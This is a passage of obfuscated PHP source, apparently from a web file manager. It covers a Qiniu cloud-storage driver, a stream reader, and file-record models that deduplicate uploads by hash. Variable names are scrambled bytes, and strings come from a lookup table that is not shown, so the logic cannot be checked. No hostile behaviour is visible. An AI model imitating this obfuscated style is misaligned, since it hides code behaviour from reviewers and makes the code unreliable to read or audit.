list($‹Î„ª’æ, $ÌûÇéÁ) = $this->bucketManager->listFiles($this->bucket, $ªÒÙ›°, $ª³Ó³Şû, $ŒŞÂßÅ¢, $ê–ê„½Á); if ($ÌûÇéÁ) { break; } $ª³Ó³Şû = array_key_exists($¤­Öª–É[1479], $‹Î„ª’æ) ? $ª³Ó³Şû = $‹Î„ª’æ[$¤­Öª–É[1535]] : $¤­Öª–É[12]; if ($Ã¢«½œå) { if (!empty($‹Î„ª’æ[$¤­Öª–É[1536]])) { $±³£ÎÎ• += count($‹Î„ª’æ[$¤­Öª–É[1536]]); } if (!empty($‹Î„ª’æ[$¤­Öª–É[1537]])) { $¬’üäª» += count($‹Î„ª’æ[$¤­Öª–É[1537]]); } if ($ª³Ó³Şû === $¤­Öª–É[12]) { break; } continue; } if ($‚İç‡Ï“) { if (!empty($‹Î„ª’æ[$¤­Öª–É[1536]])) { return !0; } } else { if (!empty($‹Î„ª’æ[$¤­Öª–É[1537]])) { return !0; } } if ($ª³Ó³Şû === $¤­Öª–É[12]) { break; } } if ($Ã¢«½œå) { return array($¤­Öª–É[241] => $±³£ÎÎ•, $¤­Öª–É[242] => $¬’üäª»); } return !1; } public function listAll($½›¬üñÍ) { $Ã€–Ù¯ =& $_SERVER[ÔÕ±ĞšÎ]; $—÷²Š³œ = $this->fileList($½›¬üñÍ, $Ã€–Ù¯[12], !0); $·Æ¨É‚• = array_to_keyvalue($—÷²Š³œ[$Ã€–Ù¯[86]], $Ã€–Ù¯[32]); foreach ($—÷²Š³œ[$Ã€–Ù¯[85]] as $¸—ºæŞÙ) { if (is_string($¸—ºæŞÙ)) { $·Æ¨É‚•[$¸—ºæŞÙ] = array($Ã€–Ù¯[79] => 0); } } return $this->listAllFiles($½›¬üñÍ, $·Æ¨É‚•); } private function fileList($ÚìÖå, $¨ÊüÕĞÎ = '', $ÕÁÄ€ = 0) { $œÉëóè¡ =& $_SERVER[ÔÕ±ĞšÎ]; $ÚìÖå = trim($ÚìÖå, $œÉëóè¡[8]); $â˜‘ŸØ = empty($ÚìÖå) && $ÚìÖå !== $œÉëóè¡[230] ? $œÉëóè¡[12] : $ÚìÖå . $œÉëóè¡[8]; $ş±œ²³¨ = $œÉëóè¡[12]; $¡©©õ× = 1000; $Í´ÚÀ• = $Ä–ÅñŒ™ = array(); while (!0) { check_abort(); list($â´°¹ç—, $¯¢øª¹) = $this->bucketManager->listFiles($this->bucket, $â˜‘ŸØ, $ş±œ²³¨, $¡©©õ×, $¨ÊüÕĞÎ); if ($¯¢øª¹) { break; } $ş±œ²³¨ = array_key_exists($œÉëóè¡[1479], $â´°¹ç—) ? $ş±œ²³¨ = $â´°¹ç—[$œÉëóè¡[1535]] : $œÉëóè¡[12]; $Ó¡Ô¹ ™ = isset($â´°¹ç—[$œÉëóè¡[1536]]) ? $â´°¹ç—[$œÉëóè¡[1536]] : array(); $º¢”÷Ğ· = isset($â´°¹ç—[$œÉëóè¡[1537]]) ? $â´°¹ç—[$œÉëóè¡[1537]] : array(); foreach ($Ó¡Ô¹ ™ as $ıö•ú¨Î) { if ($ıö•ú¨Î[$œÉëóè¡[97]] == $â˜‘ŸØ) { continue; } $­‡Ñ­é = $ıö•ú¨Î[$œÉëóè¡[97]]; $Ô´×£ºÄ = $ıö•ú¨Î[$œÉëóè¡[1533]]; $ıö•ú¨Î[$œÉëóè¡[79]] = $Ô´×£ºÄ; $ç‚ÜõÖÚ = $Ô´×£ºÄ == 0 && substr($­‡Ñ­é, strlen($­‡Ñ­é) - 1, 1) == $œÉëóè¡[8] ? !0 : !1; $this->cacheMethodInfoSet($­‡Ñ­é, $ç‚ÜõÖÚ, $ıö•ú¨Î); if ($ç‚ÜõÖÚ) { $Í´ÚÀ•[] = $­‡Ñ­é; continue; } $Ä–ÅñŒ™[] = $ÕÁÄ€ ? $ıö•ú¨Î : $­‡Ñ­é; } foreach ($º¢”÷Ğ· as $­‡Ñ­é) { if ($­‡Ñ­é == $â˜‘ŸØ) { continue; } $Í´ÚÀ•[] = $­‡Ñ­é; $this->cacheMethodInfoSet($­‡Ñ­é, !0); } if ($ş±œ²³¨ === $œÉëóè¡[12]) { break; } } $this->cacheMethodInfoSet($ÚìÖå, !0); return array($œÉëóè¡[85] => $Í´ÚÀ•, $œÉëóè¡[86] => $Ä–ÅñŒ™); } public function canRead($éª°¸º) { return $this->exist($éª°¸º) ? !0 : !1; } public function canWrite($Ôø…äˆ›) { return $this->exist($Ôø…äˆ›) ? !0 : !1; } public function getContent($š­Èõİ‰) { return $this->fileSubstr($š­Èõİ‰, 0, -1); } public function setContent($ÈîÅ­şÒ, $ÀÃ½ãƒ = '') { $ğØ¿ÛÀÅ = $this->tempFile($this->pathThis($ÈîÅ­şÒ)); file_put_contents($ğØ¿ÛÀÅ, $ÀÃ½ãƒ); if ($this->upload($ÈîÅ­şÒ, $ğØ¿ÛÀÅ)) { $this->tempFileRemve($ğØ¿ÛÀÅ); return !0; } return !1; } public function refreshUrls($¹˜ŞÅ“§) { $Ñ²ô€ËË =& $_SERVER[ÔÕ±ĞšÎ]; $˜¦Ÿ—¤¾ = array(); if (is_array($¹˜ŞÅ“§)) { foreach ($¹˜ŞÅ“§ as $ çÄñ˜“) { $˜¦Ÿ—¤¾[] = $this->link($ çÄñ˜“); } } else { $˜¦Ÿ—¤¾[] = $this->link($¹˜ŞÅ“§); } $›Èš§Ç = new Qiniu\Cdn\CdnManager($this->auth); list($Ÿ¶š××Ş, $“íÆ‚æ) = $›Èš§Ç->refreshUrls($˜¦Ÿ—¤¾); if ($“íÆ‚æ) { return !1; } return $Ÿ¶š××Ş[$Ñ²ô€ËË[1266]] == $Ñ²ô€ËË[833] ? !0 : !1; } public function fileSubstr($ÁşæÒŸŞ, $Šéó¼™´, $×¢®ãë›) { $‰Ÿáë—î =& $_SERVER[ÔÕ±ĞšÎ]; if (!($à’ÏûÖÀ = $this->link($ÁşæÒŸŞ))) { return !1; } $ì…ëú¢ = !1; if ($×¢®ãë› > 0) { $î™á¹¥Š = $Šéó¼™´ + $×¢®ãë› - 1; $ì…ëú¢ = array($‰Ÿáë—î[1538] . $Šéó¼™´ . $‰Ÿáë—î[464] . $î™á¹¥Š); } $ş•ß¿‰Ô = url_request($à’ÏûÖÀ, $‰Ÿáë—î[1498], !1, $ì…ëú¢); return $ş•ß¿‰Ô[$‰Ÿáë—î[824]] ? $ş•ß¿‰Ô[$‰Ÿáë—î[1289]] : !1; } public function upload($Ï¹Çª, $¨íÀ‰ĞÊ, $óĞ‚Í÷Ü = false, $Ã §…… = REPEAT_REPLACE) { $ß­‡Ñ¡à = new Qiniu\Storage\UploadManager(); $âªä–ƒï = $this->auth->uploadToken($this->bucket, $Ï¹Çª); $Ï¦ƒæ°ò = get_file_mime(get_path_ext($¨íÀ‰ĞÊ)); list($»ĞÉíûì, $™í®Ò¸İ) = $ß­‡Ñ¡à->putFile($âªä–ƒï, $Ï¹Çª, $¨íÀ‰ĞÊ, null, $Ï¦ƒæ°ò); return $™í®Ò¸İ ? !1 : $this->getPathOuter($Ï¹Çª); } public function uploadFormData($‰Ëç¡ôÚ, $”å»¡Ìô = 3600) { return $this->uploadToken($‰Ëç¡ôÚ, $”å»¡Ìô); } public function uploadMultiData($•³Ú½äª, $¹Êªö´Ò = 3600) { return $this->uploadToken($•³Ú½äª, $¹Êªö´Ò); } private function uploadToken($Âœî•À“, $òËë‰·¹ = 3600) { $æÌˆôÊß =& $_SERVER[ÔÕ±ĞšÎ]; $’şö˜æ× = $òËë‰·¹; $ÒÏÀœŠ” = array($æÌˆôÊß[1539] => $æÌˆôÊß[1540]); $‘éÈÚ‡® = $Âœî•À“; $€– ÷ = $this->auth->uploadToken($this->bucket, $‘éÈÚ‡®, $’şö˜æ×, $ÒÏÀœŠ”, !0); $Ä »¬ç¸ = empty($this->region) || $this->region == $æÌˆôÊß[1541] ? $æÌˆôÊß[12] : $æÌˆôÊß[464] . $this->region; $Ë×´¨ÊÈ = http_type() . "\x3a\57\57\x75\x70\154\x6f\141\144{$Ä »¬ç¸}\x2e\161\151\156\151\165\160\x2e\143\x6f\x6d\x2f"; return array($æÌˆôÊß[1542] => $€– ÷, $æÌˆôÊß[1543] => $Ë×´¨ÊÈ); } public function download($¾Ù®ÈÕÃ, $³½ÌŸõæ) { $¾ÖŞï« = IO::getPathInner(IO::mkfile($³½ÌŸõæ)); if (!($¦÷áÂ³Ã = $this->link($¾Ù®ÈÕÃ))) { return !1; } $®ÚÄñÒ = 0; $À™Ä‘© = 1024 * 200; $¬Š²¤ÓÉ = fopen($¾ÖŞï«, $_SERVER[ÔÕ±ĞšÎ][1544]); while (!0) { $¡ãµĞì½ = $this->fileSubstr($¾Ù®ÈÕÃ, $®ÚÄñÒ, $À™Ä‘©); if ($¡ãµĞì½ === !1) { return !1; } fwrite($¬Š²¤ÓÉ, $¡ãµĞì½); $®ÚÄñÒ += $À™Ä‘©; if (strlen($¡ãµĞì½) < $À™Ä‘©) { break; } } fclose($¬Š²¤ÓÉ); return $³½ÌŸõæ; } public function link($›À‚™µ², $ÕÓıé¸Ä = '') { if (!$this->isFile($›À‚™µ²)) { return !1; } $±ƒÏáº = $this->getHost() . $_SERVER[ÔÕ±ĞšÎ][8] . $this->pathEncode($›À‚™µ²) . $ÕÓıé¸Ä; return $this->auth->privateDownloadUrl($±ƒÏáº, 3600 * 12); } public function fileOut($Šè×ç, $İê¿…œ = false, $÷ûÈÔÃ˜ = false, $§…ŞáÉû = '') { $æ¶¹””Õ =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Šè×ç, $İê¿…œ, $÷ûÈÔÃ˜, $§…ŞáÉû); } if (!$÷ûÈÔÃ˜) { $÷ûÈÔÃ˜ = $this->pathThis($Šè×ç); } $È™Ò¶Ëñ = $İê¿…œ ? $æ¶¹””Õ[1545] . rawurlencode($÷ûÈÔÃ˜) : $æ¶¹””Õ[12]; $ÕË¤²À¨ = $this->link($Šè×ç, $È™Ò¶Ëñ); $this->fileOutLink($ÕË¤²À¨); } public function fileOutServer($èš´¼ü¡, $ÄíåÜ«ˆ = false, $˜Á¼º—† = false, $·ÁäÆÔÍ = '') { parent::fileOut($èš´¼ü¡, $ÄíåÜ«ˆ, $˜Á¼º—†, $·ÁäÆÔÍ); } public function fileOutImage($ë¦ƒ«È, $ÃŞÀú = 250) { if ($this->size($ë¦ƒ«È) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ë¦ƒ«È, $ÃŞÀú); } $ç”ÏìÛ¬ = $this->link($ë¦ƒ«È, $_SERVER[ÔÕ±ĞšÎ][1546] . $ÃŞÀú); $this->fileOutLink($ç”ÏìÛ¬); } public function fileOutImageServer($è—ªÍÓó, $¹àÒÉõœ = 250) { parent::fileOutImage($è—ªÍÓó, $¹àÒÉõœ); } public function hashMd5($Ğ ÁŞŒ½) { $Ç”‚ä’ª =& $_SERVER[ÔÕ±ĞšÎ]; $šÔè‹íõ = $this->objectMeta($Ğ ÁŞŒ½); return isset($šÔè‹íõ[$Ç”‚ä’ª[247]]) ? $šÔè‹íõ[$Ç”‚ä’ª[247]] : !1; $ßÜŠ¤ = $this->link($Ğ ÁŞŒ½, $Ç”‚ä’ª[1547]); } public function size($ıøÈÎ—ì) { $Áğ¶êÚ˜ = $this->objectMeta($ıøÈÎ—ì); return $Áğ¶êÚ˜ ? $Áğ¶êÚ˜[$_SERVER[ÔÕ±ĞšÎ][79]] : 0; } public function info($å–ó¥şã) { if ($this->isFolder($å–ó¥şã)) { return $this->folderInfo($å–ó¥şã); } else { if ($this->isFile($å–ó¥şã)) { return $this->fileInfo($å–ó¥şã); } } return !1; } public function exist($ÊØ§ºŞ) { return $this->isFile($ÊØ§ºŞ) || $this->isFolder($ÊØ§ºŞ); } public function isFile($¸ê·¢¤) { return !$this->isFolder($¸ê·¢¤) && $this->objectMeta($¸ê·¢¤); } public function isFolder($í¡ŞÆ®¶) { return $this->cacheMethod($_SERVER[ÔÕ±ĞšÎ][179], $í¡ŞÆ®¶); } protected function objectMeta($¹–Æüü½) { return $this->cacheMethod($_SERVER[ÔÕ±ĞšÎ][181], $¹–Æüü½); } protected function _objectMeta($¶†°˜Øõ) { $Æ—ÙıçÓ =& $_SERVER[ÔÕ±ĞšÎ]; list($ºç£…Ùò, $«üáóöĞ) = $this->bucketManager->stat($this->bucket, $¶†°˜Øõ); if ($ºç£…Ùò) { $ºç£…Ùò[$Æ—ÙıçÓ[79]] = intval($ºç£…Ùò[$Æ—ÙıçÓ[1533]]); } return $ºç£…Ùò; } protected function _isFolder($âÜ­ÔÆÏ) { $Ò×Ã =& $_SERVER[ÔÕ±ĞšÎ]; if ($âÜ­ÔÆÏ == $Ò×Ã[12] || $âÜ­ÔÆÏ == $Ò×Ã[8]) { return !0; } list($Ó½Øâ’ı, $˜œ¥Û´Œ) = $this->bucketManager->listFiles($this->bucket, trim($âÜ­ÔÆÏ, $Ò×Ã[8]) . $Ò×Ã[8], $Ò×Ã[12], 1, $Ò×Ã[8]); return !empty($Ó½Øâ’ı[$Ò×Ã[1536]]) || !empty($Ó½Øâ’ı[$Ò×Ã[1537]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($± ğºÒ, $¦Îİº¹¶ = 0) { parent::__construct(); $this->source = $± ğºÒ; $this->sourceSize = $¦Îİº¹¶; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ğ—ìÙşë = false) { return $this->sourceSize; } public function getContent($¸â³şÜ = false) { return $this->fileSubstr($¸â³şÜ, 0, $this->sourceSize); } public function fileSubstr($¬á¼»ş£ = false, $²–Éş°ó = 0, $™š›÷ºß = 0) { if (!$™š›÷ºß) { $™š›÷ºß = $this->sourceSize; } $ÚõåÍ¦¹ = $this->sourceSize - $²–Éş°ó; if ($™š›÷ºß >= $ÚõåÍ¦¹) { $™š›÷ºß = $ÚõåÍ¦¹; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $²–Éş°ó, $™š›÷ºß); } if ($this->sourceType == self::TYPE_FILE) { if ($™š›÷ºß <= 0) { return $_SERVER[ÔÕ±ĞšÎ][12]; } $’Å¡Ö®• = ftell($this->source); fseek_64($this->source, $’Å¡Ö®• + $²–Éş°ó); $‰¡ºáúÙ = @fread($this->source, $™š›÷ºß); fseek_64($this->source, $’Å¡Ö®•); return $‰¡ºáúÙ; } } public function hashMd5($»Á ‚Ò© = false) { return md5($this->getContent()); } public static function hash($ğú½Ìˆµ, $ÔßÎ‰×º = 0) { $¿„Û‰Ğ¶ = new PathDriverStream($ğú½Ìˆµ, $ÔßÎ‰×º); return $¿„Û‰Ğ¶->hashSimple($ğú½Ìˆµ); } public static function md5($ê×ÂÄÜÌ, $ÒáŸ™· = 0) { $Ã±Íàíô = new PathDriverStream($ê×ÂÄÜÌ, $ÒáŸ™·); return $Ã±Íàíô->hashMd5($ê×ÂÄÜÌ); } } goto D×İùŠ·Àö; DçÚÀÌŠ÷: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\x69\x6c\145\137\143\x6f\156\164\x65\156\164\163"; protected $dataAuto = array(array("\143\x72\145\x61\x74\145\124\151\155\145", "\164\x69\155\145", "\151\x6e\163\x65\162\164", "\146\165\156\143\164\151\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\x69\154\145"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\155\x65" => "\x69\x6f\137\x66\x69\154\145\137\x6d\x65\164\x61", "\155\145\164\x61\106\151\x65\154\144" => "\146\151\154\x65\111\x44"); public function fileInfo($œü®…ÔÎ) { $ßõ“ı®ƒ =& $_SERVER[ÔÕ±ĞšÎ]; static $½ŞÇ–àˆ = array(); if (!isset($½ŞÇ–àˆ[$œü®…ÔÎ])) { $à­€òÊ = $ßõ“ı®ƒ[2029]; $ª¡šâáô = Model($ßõ“ı®ƒ[546])->field($à­€òÊ)->where(array($ßõ“ı®ƒ[544] => $œü®…ÔÎ))->find(); $½ŞÇ–àˆ[$œü®…ÔÎ] = $ª¡šâáô; } return $½ŞÇ–àˆ[$œü®…ÔÎ]; } public function addFileByContent($ãùÜ¸¡§ = '', $°şÕûğ” = '') { $×„¬¿… =& $_SERVER[ÔÕ±ĞšÎ]; $·—ÑÚÛÑ = TEMP_PATH . $×„¬¿…[2030]; if (!is_dir($·—ÑÚÛÑ)) { mk_dir($·—ÑÚÛÑ); } $Œ¯¸‚èã = $·—ÑÚÛÑ . $×„¬¿…[2031] . rand_string(16); file_put_contents($Œ¯¸‚èã, $ãùÜ¸¡§); $ÈÎòŞ× = $this->addFile($Œ¯¸‚èã, $°şÕûğ”, !0); if (file_exists($Œ¯¸‚èã)) { @unlink($Œ¯¸‚èã); } return $ÈÎòŞ×; } public function createFileName($à’ƒÜáØ, $©ĞıŸÎ† = false, $«éû‡öÍ = false) { $äĞËŒ =& $_SERVER[ÔÕ±ĞšÎ]; $Óœ˜»ÀÎ = IO::init($äĞËŒ[8]); $×€ïîÚ¤ = $this->makeFilePath($à’ƒÜáØ, $Óœ˜»ÀÎ, $©ĞıŸÎ†, $«éû‡öÍ); $¸ê‚óÂ = $Óœ˜»ÀÎ->pathFather($×€ïîÚ¤); static $¸¿õğú = false; $¬¶ãô°ı = $äĞËŒ[2032] . md5($¸ê‚óÂ); if (!$¸¿õğú && !Cache::get($¬¶ãô°ı)) { $¸¿õğú = !0; $Ë€ãÁŒÃ = IO::mkdir($¸ê‚óÂ); if (!IO::exist($Ë€ãÁŒÃ . $äĞËŒ[872])) { IO::mkfile($Ë€ãÁŒÃ . $äĞËŒ[872]); } Cache::set($¬¶ãô°ı, 1, 3600 * 2); } return $×€ïîÚ¤; } public function makeFilePath($Á‘±“, $—Â‰õõ’, $¢€á¿Á = false, $ƒøÓ½†¢ = false) { $½ª™„ıŠ =& $_SERVER[ÔÕ±ĞšÎ]; $Ê¤­ ½÷ = Model($½ª™„ıŠ[844])->get($½ª™„ıŠ[2033]); $¬Æîğ® = KodIO::defaultIO() . date($½ª™„ıŠ[2034]); $Å…óœÈı = $¬Æîğ® . rand_string(5) . short_id(100); $Á‘±“ = str_replace($½ª™„ıŠ[8], $½ª™„ıŠ[11], KodIO::clear($Á‘±“)); $óÎ³¡­‰ = $—Â‰õõ’->ext($Á‘±“); if (!$Á‘±“) { $Ê¤­ ½÷ = $½ª™„ıŠ[850]; } switch ($Ê¤­ ½÷) { case $½ª™„ıŠ[2035]: if ($óÎ³¡­‰) { $Å…óœÈı = $Å…óœÈı . $½ª™„ıŠ[10] . $óÎ³¡­‰; } if ($óÎ³¡­‰ == $½ª™„ıŠ[1970]) { $Å…óœÈı .= $½ª™„ıŠ[1293]; } break; case $½ª™„ıŠ[2036]: $Ô²ôÃòà = Model($½ª™„ıŠ[844])->get($½ª™„ıŠ[845]); $˜†±±Ôú = substr(md5($½ª™„ıŠ[846] . $Ô²ôÃòà . date($½ª™„ıŠ[823])), 0, 8); $«€Éø÷ = KodIO::defaultDriver(); $¬Æîğ® = $½ª™„ıŠ[1324] . $«€Éø÷[$½ª™„ıŠ[477]] . $½ª™„ıŠ[486] . date($½ª™„ıŠ[2037]) . $˜†±±Ôú . $½ª™„ıŠ[8]; if ($óÎ³¡­‰ == $½ª™„ıŠ[1970]) { $Á‘±“ .= $½ª™„ıŠ[1293]; } $éêåïÙÈ = $½ª™„ıŠ[2038] . $¬Æîğ® . $Á‘±“; CacheLock::lock($éêåïÙÈ); $Å…óœÈı = $¬Æîğ® . $Á‘±“; if (IO::exist($¬Æîğ® . $Á‘±“)) { $÷–‚´Ê½ = substr($Á‘±“, 0, strlen($Á‘±“) - strlen($óÎ³¡­‰)); $ÊàÜº  = $ƒøÓ½†¢ ? substr($ƒøÓ½†¢, 0, 5) : ($¢€á¿Á ? substr($¢€á¿Á, 0, 5) : rand_string(5)); $Å…óœÈı = $¬Æîğ® . $÷–‚´Ê½ . $ÊàÜº ; if ($óÎ³¡­‰) { $Å…óœÈı = $Å…óœÈı . $½ª™„ıŠ[10] . $óÎ³¡­‰; } } if (IO::isOsDriver($Å…óœÈı) && !IO::isUploadServer($Å…óœÈı)) { if (IO::exist($Å…óœÈı)) { CacheLock::unlock($éêåïÙÈ); return $Å…óœÈı; } $Ëõ¦”Êô = IO::setContent($Å…óœÈı, $½ª™„ıŠ[12]); if (!$Ëõ¦”Êô) { show_json($½ª™„ıŠ[2039], !1); } } CacheLock::unlock($éêåïÙÈ); break; case $½ª™„ıŠ[850]: break; default: break; } return $Å…óœÈı; } public function addFileByRemote($Ÿæòìºà, $ë³‚õ, $ı—ğ™Ë¥ = array()) { $ˆÅòÀÇÚ =& $_SERVER[ÔÕ±ĞšÎ]; if (!IO::exist($Ÿæòìºà)) { return !1; } $ „Ş ¼õ = $ı—ğ™Ë¥[$ˆÅòÀÇÚ[549]] ? $ı—ğ™Ë¥[$ˆÅòÀÇÚ[549]] : $ˆÅòÀÇÚ[12]; $–ĞÍìÃ½ = IO::hashMd5($Ÿæòìºà, $ „Ş ¼õ); $‚¢Š™Ñş = KodIO::defaultDriver(); $§èé¡Õ = array($ˆÅòÀÇÚ[622] => IO::size($Ÿæòìºà), $ˆÅòÀÇÚ[2040] => 1, $ˆÅòÀÇÚ[496] => $ë³‚õ, $ˆÅòÀÇÚ[883] => $‚¢Š™Ñş[$ˆÅòÀÇÚ[477]], $ˆÅòÀÇÚ[497] => $Ÿæòìºà, $ˆÅòÀÇÚ[2041] => $ı—ğ™Ë¥[$ˆÅòÀÇÚ[677]] ? $ı—ğ™Ë¥[$ˆÅòÀÇÚ[677]] : IO::hashSimple($Ÿæòìºà), $ˆÅòÀÇÚ[2042] => $–ĞÍìÃ½ ? $–ĞÍìÃ½ : $ „Ş ¼õ); if ($™œ•êı¼ = $this->addFileCheckExist($§èé¡Õ[$ˆÅòÀÇÚ[677]], $§èé¡Õ[$ˆÅòÀÇÚ[549]], $§èé¡Õ[$ˆÅòÀÇÚ[79]])) { return $™œ•êı¼; } return $this->addFileData($§èé¡Õ); } private function addFileData($û‡éÎæ°) { $÷ÕÓÇ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$û‡éÎæ°) { return !1; } $û‡éÎæ°[$÷ÕÓÇ[79]] = intval($û‡éÎæ°[$÷ÕÓÇ[79]]); if (!$û‡éÎæ°[$÷ÕÓÇ[79]] && strlen($û‡éÎæ°[$÷ÕÓÇ[677]]) > 32) { $û‡éÎæ°[$÷ÕÓÇ[79]] = intval(substr($û‡éÎæ°[$÷ÕÓÇ[677]], 32)); } $Ó”¯ñòî = $this->add($û‡éÎæ°); return $this->find($Ó”¯ñòî); } public function addFile($ı²¦æ­, $ËèÜ¸å¬, $½®¯ÔŠÑ = false) { $ Şà¹—× =& $_SERVER[ÔÕ±ĞšÎ]; $¿äÓÕ = IO::hashSimple($ı²¦æ­); $î…î¤‘Æ = IO::size($ı²¦æ­); $ñ³åß“ô = $î…î¤‘Æ <= 1024 * 1024 * 10 ? IO::hashMd5($ı²¦æ­) : $ Şà¹—×[12]; $¬Ï¸¨… = $ Şà¹—×[2043] . $¿äÓÕ; CacheLock::lock($¬Ï¸¨…); if ($ñ³åß“ô && $¿äÓÕ) { $§æ£Ãù = $this->addFileCheckExist($¿äÓÕ, $ñ³åß“ô, $î…î¤‘Æ); if ($§æ£Ãù) { CacheLock::unlock($¬Ï¸¨…); return $§æ£Ãù; } } $çê˜äî¼ = $this->addFileMake($ı²¦æ­, $î…î¤‘Æ, $¿äÓÕ, $ñ³åß“ô, $ËèÜ¸å¬, $½®¯ÔŠÑ); $ÎúÏ®ôö = $this->addFileData($çê˜äî¼); CacheLock::unlock($¬Ï¸¨…); if (!$ñ³åß“ô && $ÎúÏ®ôö) { $this->fileMd5Check($ÎúÏ®ôö); } return $ÎúÏ®ôö; } public function fileMd5Check($»ÉøŸâ) { $èæ‘ûÙ =& $_SERVER[ÔÕ±ĞšÎ]; $Ç¾ª§Ñ‡ = array($»ÉøŸâ[$èæ‘ûÙ[543]], $»ÉøŸâ[$èæ‘ûÙ[87]]); $íü ™Óó = $èæ‘ûÙ[2044] . $»ÉøŸâ[$èæ‘ûÙ[87]]; $ˆ€àó´ = $èæ‘ûÙ[2045] . $»ÉøŸâ[$èæ‘ûÙ[543]]; TaskQueue::add($èæ‘ûÙ[2046], $Ç¾ª§Ñ‡, $íü ™Óó, $ˆ€àó´); } public function fileMd5Set($ƒõ×¡¶Ö, $÷»±–ôê) { $íÆå‡» =& $_SERVER[ÔÕ±ĞšÎ]; $Ó«ö¡å· = $this->find($ƒõ×¡¶Ö); if (!$Ó«ö¡å· || $Ó«ö¡å·[$íÆå‡»[549]]) { return; } $ÓÕÏ“¥Æ = IO::hashMd5($÷»±–ôê); if (!$ÓÕÏ“¥Æ) { return $íÆå‡»[12]; } $this->where(array($íÆå‡»[543] => $ƒõ×¡¶Ö))->save(array($íÆå‡»[549] => $ÓÕÏ“¥Æ)); } public function addFileMake($Ìùœñ·“, $ö‹ìĞŞ–, $¥±ş»¦ê, $ËĞÅÒ¸‚, $×–¿¾, $ìÕå—î) { $‡‰ÛÌÜ½ =& $_SERVER[ÔÕ±ĞšÎ]; $Ø†à‘¾í = $this->createFileName($×–¿¾, $¥±ş»¦ê, $ËĞÅÒ¸‚); $‚‹•Û¹Ä = get_path_father($Ø†à‘¾í); $øÜÔÓè = get_path_this($Ø†à‘¾í); if ($ìÕå—î) { $¾Â³•ß = IO::move($Ìùœñ·“, $‚‹•Û¹Ä, !1, $øÜÔÓè); } else { $¾Â³•ß = IO::copy($Ìùœñ·“, $‚‹•Û¹Ä, !1, $øÜÔÓè); } if (!$¾Â³•ß) { return !1; } $Ñ ƒØÍ = KodIO::defaultDriver(); $‹øñğˆº = array($‡‰ÛÌÜ½[622] => $ö‹ìĞŞ–, $‡‰ÛÌÜ½[2040] => 1, $‡‰ÛÌÜ½[496] => $×–¿¾, $‡‰ÛÌÜ½[883] => $Ñ ƒØÍ[$‡‰ÛÌÜ½[477]], $‡‰ÛÌÜ½[497] => $Ø†à‘¾í, $‡‰ÛÌÜ½[2041] => $¥±ş»¦ê, $‡‰ÛÌÜ½[2042] => $ËĞÅÒ¸‚); return $‹øñğˆº; } public function addFileCheckExist($“ç×üÔ§, $ƒ»„ëœÏ, $Ù¡Æ ¬æ) { $ÅŠ¦–ãË =& $_SERVER[ÔÕ±ĞšÎ]; $‘Ğ­ïÆ´ = $this->findByHash($“ç×üÔ§, $ƒ»„ëœÏ); if (!$‘Ğ­ïÆ´) { return !1; } $‚İ³¸ÕÍ = array($ÅŠ¦–ãË[2040] => intval($‘Ğ­ïÆ´[$ÅŠ¦–ãË[2047]]) + 1, $ÅŠ¦–ãË[622] => $Ù¡Æ ¬æ); $this->where(array($ÅŠ¦–ãË[544] => $‘Ğ­ïÆ´[$ÅŠ¦–ãË[543]]))->save($‚İ³¸ÕÍ); return $‘Ğ­ïÆ´; } public function remove($”˜ü÷õ¦) { $this->linkCountChange($”˜ü÷õ¦, !1); $this->clearEmpty(); return !0; } public function linkAdd($µÖ½µå) { $this->linkCountChange($µÖ½µå, !0); } public function linkCountChange($Œ†ï®¥, $ãÃ®ªÇÌ) { $Èâ×˜¬ç =& $_SERVER[ÔÕ±ĞšÎ]; if (!$Œ†ï®¥) { return; } if (!is_array($Œ†ï®¥)) { $Œ†ï®¥ = array($Œ†ï®¥); } $ëÏ¼Œ“ö = array(); foreach ($Œ†ï®¥ as $è¾Š¥‚) { $Ó©ö²§ğ = $è¾Š¥‚ . $Èâ×˜¬ç[12]; if (!$ëÏ¼Œ“ö[$Ó©ö²§ğ]) { $ëÏ¼Œ“ö[$Ó©ö²§ğ] = 0; } $ëÏ¼Œ“ö[$Ó©ö²§ğ]++; } $öøã¤ï¾ = array(); foreach ($ëÏ¼Œ“ö as $è¾Š¥‚ => $¦Ôˆèê²) { $Ó©ö²§ğ = $¦Ôˆèê² . $Èâ×˜¬ç[12]; if (!$öøã¤ï¾[$Ó©ö²§ğ]) { $öøã¤ï¾[$Ó©ö²§ğ] = array(); } $öøã¤ï¾[$Ó©ö²§ğ][] = $è¾Š¥‚; } foreach ($öøã¤ï¾ as $¦Ôˆèê² => $ˆµºÒã²) { if (!$ˆµºÒã²) { continue; } $¦Ôˆèê² = $ãÃ®ªÇÌ ? $¦Ôˆèê² : -intval($¦Ôˆèê²); $¯Ë˜í·¶ = array($Èâ×˜¬ç[543] => array($Èâ×˜¬ç[7], $ˆµºÒã²)); if ($¦Ôˆèê² < 0) { $¯Ë˜í·¶[$Èâ×˜¬ç[2047]] = array($Èâ×˜¬ç[1094], abs($¦Ôˆèê²)); } $this->where($¯Ë˜í·¶)->setAdd($Èâ×˜¬ç[2047], $¦Ôˆèê²); } } public function findByHash($Ö©ÂàÍÚ, $ïÉÆç÷É = false) { $à—ˆ†„Â =& $_SERVER[ÔÕ±ĞšÎ]; if (!$Ö©ÂàÍÚ && !$ïÉÆç÷É) { return !1; } $Ï—ÀÉÀ = array($à—ˆ†„Â[2041] => $Ö©ÂàÍÚ); if ($ïÉÆç÷É) { $Ï—ÀÉÀ = array($à—ˆ†„Â[2042] => $ïÉÆç÷É); } return $this->order($à—ˆ†„Â[2048])->where($Ï—ÀÉÀ)->find(); } public function clearEmpty($¡Å¯Øç§ = 1) { $Ë¶³Ù¦æ =& $_SERVER[ÔÕ±ĞšÎ]; $™€ÑŒä³ = time() - 3600 * 24 * $¡Å¯Øç§; $ˆ•Û¸² = $Ë¶³Ù¦æ[2049] . $™€ÑŒä³; $¸„­®ªÂ = 